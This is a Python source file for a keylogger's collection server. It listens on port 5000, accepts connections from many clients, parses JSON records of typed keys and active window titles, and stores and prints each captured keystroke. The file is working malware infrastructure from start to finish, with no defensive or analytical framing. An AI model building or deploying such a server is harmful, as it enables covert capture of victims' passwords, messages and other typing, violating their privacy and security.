import socket
import json
import threading
from datetime import datetime

from src.client.key_log import database


class KeylogServer:
    def __init__(self, host="0.0.0.0", port=5000):
        self.host = host
        self.port = port
        self.server_socket = None
        self.is_running = False

    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)

            self.is_running = True
            print(f"[+] Server listening on {self.host}:{self.port}")

            while self.is_running:
                client_socket, address = self.server_socket.accept()
                print(f"[+] New connection from {address}")

                threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address),
                    daemon=True
                ).start()

        except Exception as e:
            print("[-] Server error:", e)
        finally:
            self.stop()

    def handle_client(self, client_socket, address):
        buffer = ""
        try:
            while True:
                data = client_socket.recv(4096).decode("utf-8")
                if not data:
                    break

                buffer += data

                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)

                    try:
                        keystroke = json.loads(line)

                        

                        db_ok = database.create_keystroke(
                            key_data=keystroke["KeyData"],
                            window_title=keystroke["WindowTitle"]
                        )

                        if db_ok:
                            print(f"[✓] {address} -> {keystroke['WindowTitle']} : {keystroke['KeyData']}")
                        else:
                            print(f"[x] Failed to insert from {address}")

                    except json.JSONDecodeError:
                        print("[-] Invalid JSON:", line)

        except Exception as e:
            print(f"[-] Client error {address}:", e)

        finally:
            print(f"[-] Client disconnected: {address}")
            client_socket.close()

    def stop(self):
        self.is_running = False
        if self.server_socket:
            self.server_socket.close()
        print("\n[*] Server stopped.")


if __name__ == "__main__":
    server = KeylogServer()
    server.start()

